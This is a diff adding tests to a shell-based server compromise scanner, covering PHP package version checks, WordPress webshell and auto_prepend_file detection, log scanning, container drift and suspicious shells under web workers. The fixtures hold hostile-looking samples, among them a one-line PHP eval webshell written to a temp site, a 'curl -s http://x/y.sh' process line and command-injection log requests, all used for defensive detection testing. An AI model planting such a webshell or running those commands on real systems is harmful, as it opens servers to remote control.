@@ -13,7 +13,7 @@ FAIL=0
 ok() { PASS=$((PASS + 1)); }
 bad() { FAIL=$((FAIL + 1)); echo "FAIL: $*"; }
 
-reset() { F_SEV=(); F_STAT=(); F_COMP=(); F_DETAIL=(); F_REM=(); LISTEN=""; PLEX_SEEN=0; }
+reset() { F_SEV=(); F_STAT=(); F_COMP=(); F_DETAIL=(); F_REM=(); F_KIND=(); LISTEN=""; PLEX_SEEN=0; CUR_KIND=vuln; }
 last_stat() { echo "${F_STAT[$((${#F_STAT[@]} - 1))]}"; }
 last_detail() { echo "${F_DETAIL[$((${#F_DETAIL[@]} - 1))]}"; }
 
@@ -158,6 +158,121 @@ os=ubuntu:noble
 plexcodecs=/config/Library/Application Support/Plex Media Server/Codecs
 plexso=/config/Library/Application Support/Plex Media Server/Codecs/x.so"
 [ "${F_STAT[0]}" = VULNERABLE ] && [ "${F_STAT[1]}" = IOC ] && ok || bad "container plex: ${F_STAT[*]}"
+
+
+# --- PHP package source regex (awk -v must not need escapes) ---
+DPKG_DB="php8.3-fpm	php8.3	8.3.6-0ubuntu0.24.04.13
+php-common	php-defaults	2:93ubuntu2
+libapache2-mod-php8.3	php8.3	8.3.6-0ubuntu0.24.04.13"
+[ "$(src_versions '^php[0-9]+([.][0-9]+)?$' | cut -f1)" = php8.3 ] && ok || bad "src_versions php regex"
+[ -z "$(src_versions '^php[0-9]+([.][0-9]+)?$' 2>&1 >/dev/null)" ] && ok || bad "src_versions should not warn"
+DPKG_DB=""
+
+# --- finding kinds and verdict ---
+reset; add CRIT VULNERABLE x y php; [ "${F_KIND[0]}" = vuln ] && ok || bad "vuln kind"
+reset; add HIGH CHECK x y wp_ioc; [ "${F_KIND[0]}" = ioc ] && ok || bad "rem key makes ioc kind"
+reset; add CRIT IOC x y; [ "${F_KIND[0]}" = ioc ] && ok || bad "IOC status makes ioc kind"
+reset; add CRIT VULNERABLE x y php; [ "$(verdict)" = clean ] && ok || bad "verdict ignores vulns"
+reset; add INFO CHECK x y attempts; [ "$(verdict)" = clean ] && ok || bad "verdict ignores INFO"
+reset; add MED CHECK x y crash; [ "$(verdict)" = review ] && ok || bad "verdict review"
+reset; add MED CHECK x y crash; add CRIT IOC x y webshell; [ "$(verdict)" = compromised ] && ok || bad "verdict compromised"
+
+# --- probe output evaluation ---
+reset
+eval_ioc_output "service wp" "upphp=/var/www/html/wp-content/uploads/2026/10/x.php
+sig=/var/www/html/wp-content/themes/t/404.php
+prepend=/var/www/html/.user.ini|auto_prepend_file = '/var/www/html/wordfence-waf.php'
+prepend=/var/www/html/wp-admin/.user.ini|auto_prepend_file=/tmp/.x.php
+plug=/var/www/html/wp-content/plugins/wp-cache-helper
+plug=/var/www/html/wp-content/plugins/updraftplus
+mu=/var/www/html/wp-content/mu-plugins/0.php
+recent=/var/www|12" "/var/www/html"
+got="${F_COMP[*]}"
+case $got in *"PHP in uploads folder"*"Webshell code"*"auto_prepend_file set"*"WordPress mu-plugins changed"*"Plugins changed (UpdraftCentral)"*) ok ;; *) bad "eval_ioc_output rows: $got" ;; esac
+case "${F_DETAIL[*]}" in *wordfence*) bad "wordfence prepend should be allowed" ;; *) ok ;; esac
+case "${F_DETAIL[*]}" in *"wp-cache-helper"*) ok ;; *) bad "suspicious plugin listed" ;; esac
+case "${F_DETAIL[*]}" in *"updraftplus"*) bad "updraftplus itself should be skipped" ;; *) ok ;; esac
+reset
+eval_ioc_output host "plug=/srv/site/wp-content/plugins/akismet
+recent=/srv|3" ""
+[ "${F_SEV[0]}" = INFO ] && ok || bad "plugin updates on non-updraft site are INFO"
+
+# --- log scanning ---
+reset
+c=$(printf '%s\n' \
+ '1.2.3.4 - - [21/Oct/2026:07:43:00 +0000] "GET /wp-content/uploads/2026/10/x.php?c=id HTTP/1.1" 200 12 "-" "curl"' \
+ '1.2.3.4 - - [21/Oct/2026:07:44:00 +0000] "GET /wp-content/uploads/shell.php HTTP/1.1" 404 12 "-" "curl"' \
+ '5.6.7.8 - - [21/Oct/2026:08:00:00 +0000] "GET /?x=%24%28id%29 HTTP/1.1" 200 1 "-" "x"' \
+ 'PHP Fatal error:  Allowed memory size of 134217728 bytes exhausted (tried to allocate 20480 bytes)' \
+ '[Tue Oct 21 07:43:01 2026] [core:notice] AH00052: child pid 31 exit signal Segmentation fault (11)' | log_counts)
+[ "$(printf '%s' "$c" | cut -f1)" = "1 1 1 1 1" ] && ok || bad "log_counts: $c"
+eval_log_counts "service wp" "$c"
+case "${F_STAT[*]}" in *IOC*) ok ;; *) bad "uploads php 200 should be IOC" ;; esac
+[ ${#F_STAT[@]} = 5 ] && ok || bad "eval_log_counts rows: ${#F_STAT[@]}"
+reset; eval_log_counts x "$(printf '' | log_counts)"; [ ${#F_STAT[@]} = 0 ] && ok || bad "empty logs → no rows"
+
+# --- container drift ---
+reset
+eval_drift "service wp" "C /run
+A /run/apache2/x.pid
+C /etc
+A /etc/cron.d/sync
+A /usr/local/bin/kworkerd
+C /etc/passwd
+A /tmp/sess_abc"
+[ "${F_STAT[0]}" = IOC ] && ok || bad "cron drop should be IOC"
+case "${F_DETAIL[1]}" in *kworkerd*passwd*|*passwd*kworkerd*) ok ;; *) bad "drift check rows: ${F_DETAIL[*]}" ;; esac
+case "${F_DETAIL[*]}" in *sess_abc*|*apache2*) bad "tmp/run noise should be ignored" ;; *) ok ;; esac
+
+# --- shells under web workers ---
+reset
+PS_OUT="  100     1 root     /usr/sbin/apache2 -k start
+  101   100 www-data /usr/sbin/apache2 -k start
+  102   101 www-data sh -c id;uname -a
+  103   101 www-data sh -c /usr/sbin/sendmail -t -i
+  200     1 root     php-fpm: master process (/usr/local/etc/php-fpm.conf)
+  201   200 www-data php-fpm: pool www
+  202   201 www-data /usr/bin/curl -s http://x/y.sh
+  300     1 root     /bin/bash /usr/local/bin/backup"
+check_web_children
+case "${F_DETAIL[0]}" in *102:*202:*|*202:*102:*) ok ;; *) bad "web children: ${F_DETAIL[*]}" ;; esac
+case "${F_DETAIL[0]}" in *sendmail*|*backup*) bad "sendmail/unrelated should be ignored" ;; *) ok ;; esac
+PS_OUT=""
+
+# --- dedupe and scope helpers ---
+COVERED=" /home/red/docker/site/html"
+is_covered /home/red/docker/site/html/wp-content && ok || bad "covered subpath"
+is_covered /home/red/docker/site/html2 && bad "prefix must match a whole dir" || ok
+COVERED=""
+[ "$(list_short "a b c d e")" = "a b c (+2 more)" ] && ok || bad "list_short"
+reset; add CRIT VULNERABLE "PHP 8.3.35" "service wp (img): 8.3.35 < 8.3.36" php
+case $(rem_scope php) in *container*) ok ;; *) bad "rem_scope container" ;; esac
+case $(rem_scope php) in *host*) bad "rem_scope should not include host" ;; *) ok ;; esac
+CAPROVER=1; out=$(rem_body php); CAPROVER=0
+case $out in *CapRover*) ok ;; *) bad "CapRover hint" ;; esac
+case $out in *"apt install"*) bad "host apt steps for container-only finding" ;; *) ok ;; esac
+reset; add CRIT VULNERABLE "PHP 8.3.6" "host php8.3 (fpm): x" php
+case $(rem_body php) in *"--only-upgrade \$(dpkg-query -W -f='\${Package}\n'"*) ok ;; *) bad "host php command: $(rem_body php | head -n1)" ;; esac
+
+# --- the probe itself, against a fake site on disk ---
+T=$(mktemp -d)
+mkdir -p "$T/site/wp-content/uploads/2026/10" "$T/site/wp-content/plugins/fresh" "$T/site/wp-admin"
+printf '<?php @eval($_POST["c"]); ?>' > "$T/site/wp-content/uploads/2026/10/img.php"
+printf '<?php // Silence is golden.' > "$T/site/wp-content/uploads/index.php"
+printf '<?php echo "hello";' > "$T/site/index.php"
+printf "auto_prepend_file = '%s/site/wordfence-waf.php'\n" "$T" > "$T/site/.user.ini"
+printf 'php_value auto_prepend_file /tmp/.cache.php\n' > "$T/site/wp-admin/.htaccess"
+pout=$(sh -c "$(ioc_probe)" probe 30 0 "$WEBSHELL_RE" "$DL_EXEC_RE" 0 "$T")
+case $pout in *"upphp=$T/site/wp-content/uploads/2026/10/img.php"*) ok ;; *) bad "probe: php in uploads" ;; esac
+case $pout in *"uploads/index.php"*) bad "probe: silence stub should be skipped" ;; *) ok ;; esac
+case $pout in *"sig=$T/site/wp-content/uploads/2026/10/img.php"*) ok ;; *) bad "probe: webshell signature" ;; esac
+case $pout in *"sig=$T/site/index.php"*) bad "probe: clean file flagged" ;; *) ok ;; esac
+case $pout in *"prepend=$T/site/wp-admin/.htaccess"*) ok ;; *) bad "probe: htaccess prepend" ;; esac
+case $pout in *"plug=$T/site/wp-content/plugins/fresh"*) ok ;; *) bad "probe: new plugin dir" ;; esac
+reset; eval_ioc_output test "$pout" ""
+[ "$(verdict)" = compromised ] && ok || bad "probe output → compromised verdict"
+case "${F_DETAIL[*]}" in *wordfence*) bad "wordfence prepend flagged" ;; *) ok ;; esac
+rm -rf "$T"
 
 # --- JSON escaping and exit code ---
 [ "$(json_str 'a"b\c')" = '"a\"b\\c"' ] && ok || bad "json_str: $(json_str 'a"b\c')"
